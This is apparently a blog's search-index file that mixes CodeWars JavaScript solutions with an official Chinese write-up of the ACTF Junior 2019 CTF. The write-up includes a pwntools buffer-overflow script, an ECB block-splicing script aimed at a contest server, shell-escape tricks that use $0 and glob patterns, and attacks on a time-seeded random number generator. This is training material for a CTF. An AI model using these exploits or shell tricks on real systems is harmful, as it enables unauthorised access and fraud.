<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[博文整理]]></title>
    <url>%2F%E5%8D%9A%E6%96%87%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[打算专门搞个整理用的东西，顺便可以看看自己有多少挖完没填的坑。 Daily Challenge 2018-12-19 Daily Challenge 2018-12-20 Daily Challenge 2018-12-21 Daily Challenge 2018-12-22 Daily Challenge 2018-12-23 Daily Challenge 2018-12-24 Daily Challenge 2018-12-25 Daily Challenge 2018-12-26 Daily Challenge 2018-12-27 Daily Challenge 2018-12-28 Daily Challenge 2018-12-29 Daily Challenge 2018-12-30 Daily Challenge 2018-12-31 Daily Challenge 2019-01-01 Daily Challenge 2019-01-02 Daily Challenge 2019-01-03 Daily Challenge 2019-01-04 Daily Challenge 2019-01-05 Daily Challenge 2019-01-06 Daily Challenge 2019-01-07 Daily Challenge 2019-01-08 Daily Challenge 2019-01-09 Daily Challenge 2019-01-10 Daily Challenge 2019-01-11 Daily Challenge 2019-01-12 Daily Challenge 2019-01-13 Daily Challenge 2019-01-14 Daily Challenge 2019-01-15 Daily Challenge 2019-01-16 Daily Challenge 2019-01-17 Daily Challenge 2019-01-18 Daily Challenge 2019-01-19 Daily Challenge 2019-01-20 Daily Challenge 2019-01-21 Daily Challenge 2019-01-22 Daily Challenge 2019-01-23 Daily Challenge 2019-01-24 Daily Challenge 2019-01-25 Daily Challenge 2019-01-26 Daily Challenge 2019-01-27 Daily Challenge 2019-01-28 Daily Challenge 2019-01-29 Daily Challenge 2019-01-30 Daily Challenge 2019-01-31 Daily Challenge Series Cryptography_Engineering_Exercise（暂时不打算填） OverTheWire-Bandit全攻略+解析（暂时不打算填） Exploit-Exercise_Fusion全攻略+解析（有弃坑的想法） Exploit-Exercise_Protostar全攻略+解析（EXP放完了，解析暂时不打算填） 逆向工程核心原理学习笔记（一）（还没开始就已经想弃坑了） PWN学习记录（短时间不可能填了） id0-rsa WP合集（暂时不打算填） WriteUp AFCTF2018-Crypto_OfficialWriteUp（完结） JarvisOJ-WP合集（弃坑） HGAME2018-week2部分WP HGAME2018-week1WP HIT2018新生赛部分WP Tools 在pip连不上网的时候安装pwntools CTF用环境搭建 安装式工具集合 轻工具个人集合 CTF轻工具个人集合 Other 关于散列函数的一点思考]]></content>
      <categories>
        <category>Notes</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019-03-12 Daily Challenge]]></title>
    <url>%2F2019-03-12-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Range Extraction in JavaScript. Currying is awesome! CodeWarsProblemRange ExtractionA format for expressing an ordered list of integers is to use a comma separated list of either individual integers or a range of integers denoted by the starting integer separated from the end integer in the range by a dash, &#39;-&#39;. The range includes all integers in the interval including both endpoints. It is not considered a range unless it spans at least 3 numbers. For example (&quot;12, 13, 15-17&quot;) Complete the solution so that it takes a list of integers in increasing order and returns a correctly formatted string in the range format. Example: 12solution([-6, -3, -2, -1, 0, 1, 3, 4, 5, 7, 8, 9, 10, 11, 14, 15, 17, 18, 19, 20]);// returns "-6,-3-1,3-5,7-11,14,15,17-20" Solution12345678910111213141516171819202122232425262728293031323334353637383940function solution(list) &#123; let ans = ""; if (!list.length) return ans; let cur = list[0]; let begin = list[0]; for (let i = 1; i &lt; list.length; ++i) &#123; if (list[i] === cur + 1) &#123; cur += 1; &#125; else &#123; if (cur - begin &gt; 1) &#123; ans += `$&#123;begin&#125;-$&#123;cur&#125;,`; &#125; else &#123; ans += begin === cur ? `$&#123;begin&#125;,` : `$&#123;begin&#125;,$&#123;cur&#125;,`; &#125; begin = cur = list[i]; &#125; &#125; if (cur - begin &gt; 1) &#123; ans += `$&#123;begin&#125;-$&#123;cur&#125;,`; &#125; else &#123; ans += begin === cur ? `$&#123;begin&#125;,` : `$&#123;begin&#125;,$&#123;cur&#125;,`; &#125; return ans.slice(0, ans.length - 1);&#125;function solution(list) &#123; for (let i = 0; i &lt; list.length; ++i) &#123; let index = i; while (list[index] - list[index+1] === -1) index += 1; if (index !== 0 &amp;&amp; index - i &gt; 1) list.splice(i, index-i+1, list[i]+"-"+list[index]); &#125; return list.join();&#125;const solution = l =&gt; l.map((cur, i, arr) =&gt; (cur - 1 === arr[i - 1] &amp;&amp; cur + 1 === arr[i + 1] ? "-" : cur)) .map((cur, i, arr) =&gt; (cur !== arr[i + 1] ? cur : "@")) .filter(e =&gt; e !== "@") .join(",") .replace(/(,-,)/g, "-");]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-03-11 Daily Challenge]]></title>
    <url>%2F2019-03-11-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is A Chain adding function in JavaScript. Currying is awesome! CodeWarsProblemA Chain adding functionWe want to create a function that will add numbers together when called in succession. 12add(1)(2);// returns 3 We also want to be able to continue to add numbers to our chain. 123add(1)(2)(3); // 6add(1)(2)(3)(4); // 10add(1)(2)(3)(4)(5); // 15 and so on. A single call should return the number passed in. 1add(1); // 1 We should be able to store the returned values and reuse them. 12345var addTwo = add(2);addTwo; // 2addTwo + 5; // 7addTwo(3); // 5addTwo(3)(5); // 10 We can assume any number being passed in will be valid whole number. Solution12345function add(n)&#123; const f = (x) =&gt; add(x+n); f.valueOf = () =&gt; n; return f;&#125;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-03-10 Daily Challenge]]></title>
    <url>%2F2019-03-10-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Where my anagrams at? in JavaScript. CodeWarsProblemWhere my anagrams at?What is an anagram? Well, two words are anagrams of each other if they both contain the same letters. For example: 1234567&apos;abba&apos; &amp; &apos;baab&apos; == true&apos;abba&apos; &amp; &apos;bbaa&apos; == true&apos;abba&apos; &amp; &apos;abbba&apos; == false&apos;abba&apos; &amp; &apos;abca&apos; == false Write a function that will find all the anagrams of a word from a list. You will be given two inputs a word and an array with words. You should return an array of all the anagrams or an empty array if there are none. For example: 12345anagrams('abba', ['aabb', 'abcd', 'bbaa', 'dada']) =&gt; ['aabb', 'bbaa']anagrams('racer', ['crazer', 'carer', 'racar', 'caers', 'racer']) =&gt; ['carer', 'racer']anagrams('laser', ['lazing', 'lazy', 'lacer']) =&gt; [] Solution123456789101112131415161718192021function anagrams(word, words) &#123; return words.filter(w =&gt; word.split("").sort().join("")===w.split("").sort().join(""))&#125;////function anagrams(word, words) &#123; word = word.split("").sort().join(""); return words.filter(w =&gt; word===w.split("").sort().join(""))&#125;////String.prototype.sort = function() &#123; return this.split("").sort().join("");&#125;;function anagrams(word, words) &#123; return words.filter(x =&gt; x.sort() === word.sort());&#125;////]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-03-09 Daily Challenge]]></title>
    <url>%2F2019-03-09-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Simple Pig Latin in JavaScript. Problem is misleading and description is like shit. Data is poor. CodeWarsProblemSimple Pig LatinMove the first letter of each word to the end of it, then add &quot;ay&quot; to the end of the word. Leave punctuation marks untouched. Examples12pigIt('Pig latin is cool'); // igPay atinlay siay oolcaypigIt('Hello world !'); // elloHay orldway ! Solution1234567function pigIt(str)&#123; return str.replace(/([a-zA-Z])([a-zA-Z]*)/gi, "$2$1ay");&#125;function pigIt(str)&#123; return str.replace(/(\w)(\w*)/gi, "$2$1ay");&#125;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-03-08 Daily Challenge]]></title>
    <url>%2F2019-03-08-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is PaginationHelper in JavaScript. Problem is misleading and description is like shit. Data is poor. CodeWarsProblemPaginationHelperFor this exercise you will be strengthening your page-fu mastery. You will complete the PaginationHelper class, which is a utility class helpful for querying paging information related to an array. The class is designed to take in an array of values and an integer indicating how many items will be allowed per each page. The types of values contained within the collection/array are not relevant. The following are some examples of how this class is used: 123456789101112var helper = new PaginationHelper(['a','b','c','d','e','f'], 4);helper.pageCount(); //should == 2helper.itemCount(); //should == 6helper.pageItemCount(0); //should == 4helper.pageItemCount(1); // last page - should == 2helper.pageItemCount(2); // should == -1 since the page is invalid// pageIndex takes an item index and returns the page that it belongs onhelper.pageIndex(5); //should == 1 (zero based index)helper.pageIndex(2); //should == 0helper.pageIndex(20); //should == -1helper.pageIndex(-10); //should == -1 Solution123456789101112131415161718192021222324252627282930313233// TODO: complete this object/class// The constructor takes in an array of items and a integer indicating how many// items fit within a single pagefunction PaginationHelper(collection, itemsPerPage)&#123; this.cap = itemsPerPage; this.size = collection.length;&#125;// returns the number of items within the entire collectionPaginationHelper.prototype.itemCount = function() &#123; return this.size;&#125;// returns the number of pagesPaginationHelper.prototype.pageCount = function() &#123; return Math.ceil(this.size/this.cap);&#125;// returns the number of items on the current page. page_index is zero based.// this method should return -1 for pageIndex values that are out of rangePaginationHelper.prototype.pageItemCount = function(pageIndex) &#123; if (pageIndex &lt; 0 || pageIndex &gt; Math.floor(this.size/this.cap)) return -1; else if (pageIndex === Math.floor(this.size/this.cap)) return this.size % this.cap; return this.cap;&#125;// determines what page an item is on. Zero based indexes// this method should return -1 for itemIndex values that are out of rangePaginationHelper.prototype.pageIndex = function(itemIndex) &#123; if (itemIndex &lt; 0 || itemIndex &gt;= this.size) return -1; return this.size===0?-1:Math.floor(itemIndex/this.cap);&#125; 12345678910111213141516171819202122232425262728293031323334// TODO: complete this object/class// The constructor takes in an array of items and a integer indicating how many// items fit within a single pagefunction PaginationHelper(collection, itemsPerPage)&#123; this.cap = itemsPerPage; this.size = collection.length;&#125;// returns the number of items within the entire collectionPaginationHelper.prototype.itemCount = function() &#123; return this.size;&#125;// returns the number of pagesPaginationHelper.prototype.pageCount = function() &#123; return Math.ceil(this.size/this.cap);&#125;// returns the number of items on the current page. page_index is zero based.// this method should return -1 for pageIndex values that are out of rangePaginationHelper.prototype.pageItemCount = function(pageIndex) &#123; return pageIndex &lt; this.pageCount() ? Math.min(this.itemsPerPage, this.size - pageIndex * this.cap) : -1;&#125;// determines what page an item is on. Zero based indexes// this method should return -1 for itemIndex values that are out of rangePaginationHelper.prototype.pageIndex = function(itemIndex) &#123; return itemIndex &lt; this.size &amp;&amp; itemIndex &gt;= 0 ? Math.floor(itemIndex/this.cap) : -1;&#125;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-03-07 Daily Challenge]]></title>
    <url>%2F2019-03-07-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Extract the domain name from a URL in JavaScript. Problem is misleading and description is like shit. Data is poor. CodeWarsProblemExtract the domain name from a URLWrite a function that when given a URL as a string, parses out just the domain name and returns it as a string. For example: 123domainName("http://github.com/carbonfive/raygun") == "github" domainName("http://www.zombie-bites.com") == "zombie-bites"domainName("https://www.cnet.com") == "cnet" Solution123456function domainName(url)&#123; let s = url.replace(/https?:\/\//, "").split("/")[0]; s = s.split("."); if (s.length &gt; 2 &amp;&amp; s[s.length-2] == "co") return s[s.length-3]; else return s[s.length-2];&#125; In fact subdomain does not need to be &quot;www&quot;, so... Shit problem]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-03-06 Daily Challenge]]></title>
    <url>%2F2019-03-06-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Weight for weight in JavaScript. Although solution is clever, I still think that this problem is so dumb. Bad details, bad description towards input and output, and bad input. CodeWarsProblemWeight for weightMy friend John and I are members of the &quot;Fat to Fit Club (FFC)&quot;. John is worried because each month a list with the weights of members is published and each month he is the last on the list which means he is the heaviest. I am the one who establishes the list so I told him: &quot;Don&#39;t worry any more, I will modify the order of the list&quot;. It was decided to attribute a &quot;weight&quot; to numbers. The weight of a number will be from now on the sum of its digits. For example 99 will have &quot;weight&quot; 18, 100 will have &quot;weight&quot; 1 so in the list 100 will come before 99. Given a string with the weights of FFC members in normal order can you give this string ordered by &quot;weights&quot; of these numbers? Example:1&quot;56 65 74 100 99 68 86 180 90&quot;` ordered by numbers weights becomes: `&quot;100 180 90 56 65 74 68 86 99&quot; When two numbers have the same &quot;weight&quot;, let us class them as if they were strings and not numbers: 100 is before 180 because its &quot;weight&quot; (1) is less than the one of 180 (9) and 180 is before 90 since, having the same &quot;weight&quot; (9), it comes before as a string. All numbers in the list are positive numbers and the list can be empty. Notes it may happen that the input string have leading, trailing whitespaces and more than a unique whitespace between two consecutive numbers Don&#39;t modify the input For C: The result is freed. Solution12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758function orderWeight(strng) &#123; return strng.match(/[^ ]+/gi) .map(Number) .map(a =&gt; a.toString()) .sort((a, b) =&gt; &#123; return a.split("").map(e =&gt; +e).reduce((a, b) =&gt; a + b) - b.split("").map(e =&gt; +e).reduce((a, b) =&gt; a + b) ? a.split("").map(e =&gt; +e).reduce((a, b) =&gt; a + b) - b.split("").map(e =&gt; +e).reduce((a, b) =&gt; a + b) : (a &lt; b ? -1 : (a &gt; b ? 1 : 0)); &#125;).join(" ")&#125;function orderWeight(strng) &#123; const digitsum = (num) =&gt; num.split("").map(e =&gt; +e).reduce((a, b) =&gt; a + b); if (strng.search(/[^ ]+/) === -1) return ""; return strng.match(/[^ ]+/gi) .map(Number) .map(a =&gt; a.toString()) .sort((a, b) =&gt; &#123; return digitsum(a)-digitsum(b) ? digitsum(a)-digitsum(b) : (a &lt; b ? -1 : (a &gt; b ? 1 : 0)); &#125;).join(" ")&#125;function orderWeight(strng) &#123; const digitsum = (num) =&gt; num.split("").map(e =&gt; +e).reduce((a, b) =&gt; a + b); if (strng.search(/[^ ]+/) === -1) return ""; return strng.match(/[^ ]+/gi) .map(Number) .map(a =&gt; a.toString()) .sort((a, b) =&gt; &#123; return digitsum(a)-digitsum(b) ? digitsum(a)-digitsum(b) : a.localeCompare(b); &#125;).join(" ")&#125;function orderWeight(strng) &#123; return strng .split(" ") .map(function(v) &#123; return &#123; val: v, key: v.split("").reduce(function(prev, curr) &#123; return parseInt(prev) + parseInt(curr); &#125;, 0) &#125;; &#125;) .sort(function(a, b) &#123; return a.key == b.key ? a.val.localeCompare(b.val) : (a.key - b.key); &#125;) .map(function(v) &#123; return v.val; &#125;) .join(" ");&#125;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-03-05 Daily Challenge]]></title>
    <url>%2F2019-03-05-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Build a pile of Cubes in JavaScript. CodeWarsProblemBuild a pile of CubesYour task is to construct a building which will be a pile of n cubes. The cube at the bottom will have a volume of n^3, the cube above will have volume of (n-1)^3 and so on until the top which will have a volume of 1^3. You are given the total volume m of the building. Being given m can you find the number n of cubes you will have to build? The parameter of the function findNb (find_nb, find-nb, findNb) will be an integer m and you have to return the integer n such as n^3 + (n-1)^3 + ... + 1^3 = m if such a n exists or -1 if there is no such n. Examples:1234567findNb(1071225) --&gt; 45findNb(91716553919377) --&gt; -1mov rdi, 1071225call find_nb ; rax &lt;-- 45mov rdi, 91716553919377call find_nb ; rax &lt;-- -1 Solution1234567891011121314151617function findNb(m) &#123; let cur = 0; let sum = 0; while (sum &lt; m) &#123; cur += 1; sum += cur * cur * cur; &#125; return sum===m?cur:-1;&#125;function findNb(m) &#123; let n = 0; while (m &gt; 0) &#123; n += 1; m -= n ** 3; return m ? -1 : n&#125;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-03-04 Daily Challenge]]></title>
    <url>%2F2019-03-04-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Array.diff in JavaScript. CodeWarsProblemArray.diffYour goal in this kata is to implement a difference function, which subtracts one list from another and returns the result. It should remove all values from list a, which are present in list b. 1array_diff([1,2],[1]) == [2] If a value is present in b, all of its occurrences must be removed from the other: 1array_diff([1,2,2,2,3],[2]) == [1,3] Solution12345678function array_diff(a, b) &#123; return a.filter(e =&gt; !b.includes(e));&#125;function array_diff(a, b) &#123; b = new Set(b) return a.filter(v =&gt; !b.has(v))&#125;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-03-03 Daily Challenge]]></title>
    <url>%2F2019-03-03-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Directions Reduction in JavaScript. CodeWarsProblemDirections ReductionOnce upon a time, on a way through the old wild west,…… a man was given directions to go from one point to another. The directions were &quot;NORTH&quot;, &quot;SOUTH&quot;, &quot;WEST&quot;, &quot;EAST&quot;. Clearly &quot;NORTH&quot; and &quot;SOUTH&quot; are opposite, &quot;WEST&quot; and &quot;EAST&quot; too. Going to one direction and coming back the opposite direction is a needless effort. Since this is the wild west, with dreadfull weather and not much water, it&#39;s important to save yourself some energy, otherwise you might die of thirst! How I crossed the desert the smart way.The directions given to the man are, for example, the following: 1[&quot;NORTH&quot;, &quot;SOUTH&quot;, &quot;SOUTH&quot;, &quot;EAST&quot;, &quot;WEST&quot;, &quot;NORTH&quot;, &quot;WEST&quot;]. or 1&#123; &quot;NORTH&quot;, &quot;SOUTH&quot;, &quot;SOUTH&quot;, &quot;EAST&quot;, &quot;WEST&quot;, &quot;NORTH&quot;, &quot;WEST&quot; &#125;; or (haskell) 1[North, South, South, East, West, North, West] You can immediatly see that going &quot;NORTH&quot; and then &quot;SOUTH&quot; is not reasonable, better stay to the same place! So the task is to give to the man a simplified version of the plan. A better plan in this case is simply: 1[&quot;WEST&quot;] or 1&#123; &quot;WEST&quot; &#125; or (haskell) 1[West] or (rust) 1[WEST]; Other examples:In [&quot;NORTH&quot;, &quot;SOUTH&quot;, &quot;EAST&quot;, &quot;WEST&quot;], the direction &quot;NORTH&quot; + &quot;SOUTH&quot; is going north and coming back right away. What a waste of time! Better to do nothing. The path becomes [&quot;EAST&quot;, &quot;WEST&quot;], now &quot;EAST&quot; and &quot;WEST&quot; annihilate each other, therefore, the final result is [] (nil in Clojure). In [&quot;NORTH&quot;, &quot;EAST&quot;, &quot;WEST&quot;, &quot;SOUTH&quot;, &quot;WEST&quot;, &quot;WEST&quot;], &quot;NORTH&quot; and &quot;SOUTH&quot; are not directly opposite but they become directly opposite after the reduction of &quot;EAST&quot; and &quot;WEST&quot; so the whole path is reducible to [&quot;WEST&quot;, &quot;WEST&quot;]. TaskWrite a function dirReduc which will take an array of strings and returns an array of strings with the needless directions removed (WE or SN side by side). The Haskell version takes a list of directions with data Direction = North | East | West | South. The Clojure version returns nil when the path is reduced to nothing. The Rust version takes a slice of enum Direction {NORTH, SOUTH, EAST, WEST}. Examples12dirReduc(["NORTH", "SOUTH", "SOUTH", "EAST", "WEST", "NORTH", "WEST"]) =&gt; ["WEST"]dirReduc(["NORTH", "SOUTH", "SOUTH", "EAST", "WEST", "NORTH"]) =&gt; [] See more examples in &quot;Example Tests&quot;NoteNot all paths can be made simpler. The path [&quot;NORTH&quot;, &quot;WEST&quot;, &quot;SOUTH&quot;, &quot;EAST&quot;] is not reducible. &quot;NORTH&quot; and &quot;WEST&quot;, &quot;WEST&quot; and &quot;SOUTH&quot;, &quot;SOUTH&quot; and &quot;EAST&quot; are not directly opposite of each other and can&#39;t become such. Hence the result path is itself : [&quot;NORTH&quot;, &quot;WEST&quot;, &quot;SOUTH&quot;, &quot;EAST&quot;]. Solution123456789101112131415161718192021222324function dirReduc(arr)&#123; let match = &#123;"NORTH": "SOUTH", "EAST": "WEST", "SOUTH": "NORTH", "WEST": "EAST"&#125;; let ans = []; for (const dir of arr) &#123; if (!ans.length || match[dir] !== ans[ans.length-1]) ans.push(dir); else ans.pop(); &#125; return ans;&#125;function dirReduc(arr) &#123; let str = arr.join(''), pattern = /NORTHSOUTH|EASTWEST|SOUTHNORTH|WESTEAST/; while (pattern.test(str)) str = str.replace(pattern,''); return str.match(/(NORTH|SOUTH|EAST|WEST)/g)||[];&#125;function dirReduc(arr)&#123; let match = &#123;"NORTH": "SOUTH", "EAST": "WEST", "SOUTH": "NORTH", "WEST": "EAST"&#125;; return arr.reduce((dirs, cur) =&gt; &#123; if (!dirs.length || match[cur] !== dirs[dirs.length-1]) dirs.push(cur); else dirs.pop(); return dirs; &#125;, []);&#125;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-03-02 Daily Challenge]]></title>
    <url>%2F2019-03-02-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Valid Braces in JavaScript. CodeWarsProblemValid BracesWrite a function that takes a string of braces, and determines if the order of the braces is valid. It should return true if the string is valid, and false if it&#39;s invalid. This Kata is similar to the Valid Parentheses Kata, but introduces new characters: brackets [], and curly braces {}. Thanks to @arnedag for the idea! All input strings will be nonempty, and will only consist of parentheses, brackets and curly braces: ()[]{}. What is considered Valid?A string of braces is considered valid if all braces are matched with the correct brace. Examples12345"()&#123;&#125;[]" =&gt; True"([&#123;&#125;])" =&gt; True"(&#125;" =&gt; False"[(])" =&gt; False"[(&#123;&#125;)](]" =&gt; False Solution12345678910111213141516171819202122232425262728293031323334353637function validBraces(braces)&#123; let stack = []; for (let i = 0; i &lt; braces.length; ++i) &#123; if (braces[i] === "(" || braces[i] === "[" || braces[i] === "&#123;") &#123; stack.push(braces[i]); &#125; else &#123; if (!stack.length) return false; if (braces[i] === ")") &#123; if (stack[stack.length-1] !== "(") return false; stack.pop(); &#125; else if (braces[i] === "]") &#123; if (stack[stack.length-1] !== "[") return false; stack.pop(); &#125; else &#123; if (stack[stack.length-1] !== "&#123;") return false; stack.pop(); &#125; &#125; &#125; return !stack.length;&#125;function validBraces(braces)&#123; let matches = &#123; '(':')', '&#123;':'&#125;', '[':']' &#125;; let stack = []; for (let i = 0; i &lt; braces.length; i++) &#123; let currentChar = braces[i]; if (matches[currentChar]) stack.push(currentChar); else if (currentChar !== matches[stack.pop()]) return false; &#125; return stack.length === 0; &#125;function validBraces(braces)&#123; while(/\(\)|\[\]|\&#123;\&#125;/g.test(braces))&#123;braces = braces.replace(/\(\)|\[\]|\&#123;\&#125;/g,"")&#125; return !braces.length; &#125;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-03-01 Daily Challenge]]></title>
    <url>%2F2019-03-01-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Create Phone Number in JavaScript. CodeWarsProblemCreate Phone NumberWrite a function that accepts an array of 10 integers (between 0 and 9), that returns a string of those numbers in the form of a phone number. Example:1createPhoneNumber([1, 2, 3, 4, 5, 6, 7, 8, 9, 0]) // =&gt; returns "(123) 456-7890" The returned format must be correct in order to complete this challenge.Don&#39;t forget the space after the closing parentheses! Solution1234567function createPhoneNumber(numbers)&#123; return `($&#123;numbers.slice(0, 3).toString().replace(/,/gi, '')&#125;) $&#123;numbers.slice(3, 6).toString().replace(/,/gi, '')&#125;-$&#123;numbers.slice(6, 10).toString().replace(/,/gi, '')&#125;`;&#125;function createPhoneNumber(numbers)&#123; return numbers.join('').replace(/(...)(...)(.*)/, '($1) $2-$3');&#125;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>CodeWars</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ACTF Junior 2019 Official WriteUP of CSUWangj's Challenge]]></title>
    <url>%2FACTF-Junior-2019-Official-WriteUP-of-CSUWangj-s-Challenge%2F</url>
    <content type="text"><![CDATA[日常出锅、、、 Linux&amp;PWNvim首先要了解vim的几个模式 然后vim在普通模式下是可以执行Linux命令的，然后就可以ls, cat flag之类的了。 感谢各位没有把容器玩坏。 No_more_gets1查看源码，问题出在第140行（rigist()+12），passwdbuf在namebuf前面，所以gets的时候可以把namebuf覆盖掉，于是就能强行注册一个密码自己设定的admin。 一个可用的exp（来自给力的学弟）如下： 1234567891011121314151617181920212223242526from pwn import *import sys# context.log_level='debug'if args['REMOTE']: sh = remote(sys.argv[1], sys.argv[2])else: sh = process("./a.out")payload=0x10 * 'a' + p64(0x0) + p64(0x555555555607)sh.recvuntil("6) Exit")sh.sendline("3")#gdb.attach(sh)#gdb.attach(sh)sh.recvuntil("Input your name")sh.sendline('father')sh.recvuntil('Input your password')sh.sendline('aaaaaaaaaaaaaaa\0admin\0')sh.recvuntil("6) Exit")sh.sendline('2')sh.sendline('admin')sh.sendline('aaaaaaaaaaaaaaa')sh.sendline('4')print sh.recvuntil('&#125;')sh.sendline('6') Special_Shell这个题是HGAME2018里看到的，感觉很有意思，YTB上有更详细的视频。 源码 有两个预期解，一方面来说，假如去阅读system()的手册会看到 Do not use system() from a program with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity. Use the *exec(3) family of functions instead, but not **execlp(3) or execvp*(3). 如果去找一些可能的实现可能可以看到下面这样的 123456789int system(const char *command)&#123; /* balabala */ execl("/bin/sh", "sh", "-c", command, (char *) NULL); _exit(127); /* We could not exec the shell */ /* balabala */ return status;&#125; 所以用$0是可以getshell的。 另一方面来说，man bash一下，了解一下meta character in bash，可以用/???/?? .得出目录，然后/???/??? ????看到flag。 No_more_gets2查看源码，问题出在开始就莫名其妙的输入用户名。 只需要了解一下字节序、ascii码，这题就能解决了。 Cryptocasear移位密码，加密时偏移量为+2，没有改变数字、大小写这几个属性 至于你说那么多人把数字改成字母、、、 算了，心累，这题提交失败超过20次的，线下逮到出题人请吃饭。。。 矾书就是把字符画的主体换成了白色字体保存成PDF。 大家还是很机灵的，顺便如果有个正好符合需求的PDF浏览器，这个题会解决得很快。 反切码这里我偷了懒，并没有深入地考察这个东西、、、只需要百度就能找到出处，因为古音有八个读音，而现在只有四个，所以特地注明了一下用普通话来读。 （其实当时想吃的是火锅，但是缺声母来着） Tiny RSA就是一个非常非常naive的RSA，简易到可以用手算，希望大家对将要到来的段老师教授的密码学有所期待，段老师真的超好！ （貌似18级开始只有信安才有密码学，但是明明计算机相关的都应该学一点） So called ECB只要学到密码学的加密模式肯定会说到不要使用ECB的，而这里为了降低还特地把用户名、密码什么的分开加密再拼接，然而没有人做，感觉很不爽，不想给exp... 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *# context.log_level='debug'def regist(r, name, passwd): print "[*] Resitering Account" r.sendline('1') r.sendline(name) r.sendline(passwd) r.recvuntil('to &#123;&#125;'.format(name)) print "[+] Succeed" return r.recv()[2:130]def transfer(r, name, passwd, to, amount): print "[*] Transferring" r.sendline('2') r.sendline(name) r.sendline(passwd) r.sendline(to) r.sendline(str(amount)) r.recvuntil('to &#123;&#125;'.format(to)) print "[+] Succeed" return r.recv()[2:130] r = remote("47.107.33.15", 45338)name = 'a'passwd = 'a'admin = 'admin'payload = regist(r, name, passwd)[:96]payload += transfer(r, name, passwd, admin, 1001)[96:128]print "[*] Stealing money from admin"for i in range(10): r.sendline('3') r.sendline(payload)print "[+] Done"print "[*] Querying flag"r.sendline('5')r.sendline(name)r.sendline(passwd)flag = r.recvuntil("&#125;")index = -1try: index = flag.index('actf')except: index = flag.index('ACTF')flag = flag[index:]print "[flag] &#123;&#125;".format(flag) Broken Random这题毕竟源码都给了，要点也都提示到了，其实没什么难度。 直接的攻击点在于srand(time(NULL)) srand()的效果是给rand()设置种子，问题就在于用time(NULL)。 从文档里可以知道，time(NULL)返回从1970-01-01 00:00:00 +0000 (UTC)开始到现在的秒数。 所以至少有以下几种攻击方式： 同时开两个terminal，同时nc一下就很有可能让两个程序用同一个种子，只需要读一个写一个就行。 把程序自己编译一遍，一边nc一边运行。 暴力猜一下服务器的时间。（本地暴力）。 RSA LabRSA相关的小问答，没什么难度。实际上这个才是tiny RSA，之前那个算是趣味小游戏的程度:D HappyBirthday生日攻击啊、、、 听到有人说这个难度大，我已经把难度降低过了 ，原来的长度有56，60和64的、、、 50位的话，碰撞一次的代价大概是$2^{25}$。 好的，前面一顿分析全当放屁，愚蠢的出题人想当然认为[:50]是前50位而忘记了那是十六进制的问题。所以正常难度应该是把代码改成[:13]或者[:12]。。。 EXP没什么好放的吧，就跑跑暴力的事情。 Non-cryptography Hash这个题是看起来难的其实一点也不难的题，因为它的值域一共就、、、那么多、、、 所以，不管是直接暴力，还是暴力建表然后查找，理论上都是可行的、、、 点击英雄1存档修改这个就不说了吧，也没有人问我，看起来都不想放弃游戏体验呢 Forensics这部分题目我个人感觉解法是很多的，在我的认知里取证和渗透类似，不同的人不同的工具都会有不同的效果，而且可能都可以达成目的，这里的解答仅作参考，如果有什么特别的解法请告知我，万分感激。 顺便这几个题对flag的字符串都没有做什么隐藏，所以除了一个人以外都是strings/脱壳后strings解出来的，令出题人感到非常伤心，这根本不好玩嘛 Popbox重定向输出流即可，cmd下可以直接&gt;，powershell需要用Out-File。 